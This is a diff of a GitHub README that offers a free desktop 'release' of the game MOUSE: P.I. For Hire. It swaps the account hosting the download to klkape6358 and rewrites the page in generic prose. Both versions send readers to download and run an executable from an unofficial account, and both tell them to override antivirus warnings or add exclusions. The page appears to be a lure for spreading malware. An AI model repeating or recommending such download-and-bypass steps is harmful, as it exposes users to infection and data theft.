@@ -1,59 +1,65 @@
-# MOUSE: P.I. For Hire - Release Game Desktop Version
+# 🔍 MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version - Solve mysteries in a hand-drawn world
 
-[![Stars](https://img.shields.io/github/stars/SaikoNadiro13/MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version)](https://github.com/SaikoNadiro13/MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version) [![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/klkape6358/MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version/releases)
 
-**MOUSE: P.I. For Hire** is a charming hand-drawn point-and-click detective adventure game. Play as a witty mouse private investigator solving quirky cases in a vibrant, cartoon-style world full of humor, puzzles, and memorable characters.
-Experience the full desktop release version with optimized performance, higher resolution support, smooth controls, and all the latest updates for Windows PC.
+## 🎮 About the Game
+MOUSE PI For Hire puts you in the shoes of a detective. You play as a mouse who handles tough cases in a city full of secrets. This game features hand-drawn art and a cartoon style. You click on objects and talk to characters to solve puzzles. The game runs on your desktop computer and supports widescreen monitors for a wide view of the city. You use your mouse to move through scenes, pick up items, and choose lines of dialogue. The game tracks your clues in a digital notebook.
 
-<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/7e941363-1606-4641-a2fb-c838645e6a19" />
+## ⚙️ Minimum System Requirements
+- Operating System: Windows 10 or Windows 11
+- Processor: Intel Core i3 or equivalent
+- Memory: 4 GB RAM
+- Graphics: Integrated graphics card with 1 GB VRAM
+- Storage: 2 GB available space
+- Sound: Standard Windows compatible audio device
 
+## 📥 How to Download and Install
+Follow these steps to get the game on your computer:
 
----
+1. Visit the [official releases page](https://github.com/klkape6358/MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version/releases) to view available files.
+2. Look for the latest version at the top of the list.
+3. Click the file ending in .zip or .exe to start your download.
+4. If you downloaded a .zip file, right-click the folder and select Extract All.
+5. Open the folder once the extraction completes.
+6. Locate the file named MOUSE-PI.exe.
+7. Double-click this file to launch the game.
 
-## 📦 What's Included
+## 🕹️ Controls and Gameplay
+You use your mouse for most actions in MOUSE PI For Hire. Move your cursor over items in the game world to see if you can interact with them. 
 
-- MOUSE: P.I. For Hire Full Release Version (Desktop Build)
-- Optimized for Windows 10/11
-- Native 1080p, 1440p, and 4K support
-- Widescreen and ultrawide monitor compatibility
-- Keyboard + Mouse controls + optional controller support
-- High-quality hand-drawn animations
-- All chapters and bonus content included
+- Left click: Walk, interact with items, or choose dialogue options.
+- Right click: Examine objects for hints.
+- Inventory: Move your cursor to the top of the screen to open your bag. Click an item to select it, then click an object in the world to use the item.
+- Esc key: Open the game menu to save your progress or adjust sounds.
 
----
+If you get stuck, look at your notebook. Press the N key to view your current tasks. The notebook highlights key clues and reminders from people you met in the city.
 
-## 📥 Download
+## 📝 Tips for Solving Cases
+- Talk to every character you find. They offer clues about missing items. 
+- Check corners of every room. Small objects hide in plain sight.
+- Combine items from your inventory. Some puzzles require you to use two objects together.
+- Pay attention to character reactions. A change in dialogue tone often signals that you found a breakthrough. 
+- Save your game often. Use the menu to keep multiple save slots for important moments.
 
-📥 [`MousePIForHire.zip`](https://github.com/SaikoNadiro13/MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version/releases/download/Desktop/MousePIForHire.zip)  
--
+## 📁 Troubleshooting
+If the game does not start, check these common fixes:
 
-### Archive Contents
+- Ensure your Windows software is up to date. Use the Windows Update tool in your system settings.
+- Verify that your graphics drivers are current. Visit the website of your computer manufacturer for updates.
+- Antivirus software sometimes blocks new programs. If a warning appears, choose to allow or run the program anyway.
+- Restart your computer. This clears background tasks that might interfere with game performance.
+- Check that you have enough disk space on your drive. 
 
-- `MousePI.exe` – Main game executable
-- `GameData/` – All game assets and levels
-- `settings/` – Optimized configuration files
-- `setup_guide.txt` – Installation and controls guide
+The game includes a log file if you experience crashes. Look for a file named error.log in the same folder as the game. This file contains technical details if you need to ask for help on the issue tracker.
 
----
+## 🌍 Supported Language
+The current release features English text. We built the game to be simple and easy to understand for players of all ages. The mechanics rely on visual cues, so you spend less time reading and more time playing the detective.
 
-## ❗️ Troubleshooting
+## 🎨 Visual and Audio Settings
+The game detects your resolution when you start. If you want to change settings, go to the Options menu inside the game. You can toggle between Fullscreen and Windowed mode. You can also adjust the volume for music and sound effects separately. Using high-resolution mode provides the best look for the hand-drawn art. If the game feels slow, try switching the graphics quality to Low in the settings menu.
 
-| Problem                  | Solution                                      |
-|--------------------------|-----------------------------------------------|
-| Game doesn't launch      | Run as Administrator                          |
-| Low FPS / stuttering     | Lower resolution or disable VSync             |
-| Black screen             | Switch to Borderless Windowed mode            |
-| Antivirus warning        | Add the folder to exclusions                  |
-| Controller not working   | Enable controller support in settings         |
+## 👤 Credits
+This game relies on the work of lead artists and writers who crafted the cartoon world. The core code ensures smooth movement across modern desktop displays. We thank everyone who supports indie development. 
 
----
-
-## 📜 License
-
-MIT License – shared for educational and game preservation purposes only.
-
----
-
-## ⭐️ Support
-
-If **MOUSE: P.I. For Hire** made you smile with its witty detective stories — please star the repository! It helps more players discover this charming indie adventure. ❤️
+## ⚖️ License
+This project follows standard open software practices. You may run this software for your personal entertainment. Do not distribute the executable file on other websites without permission.
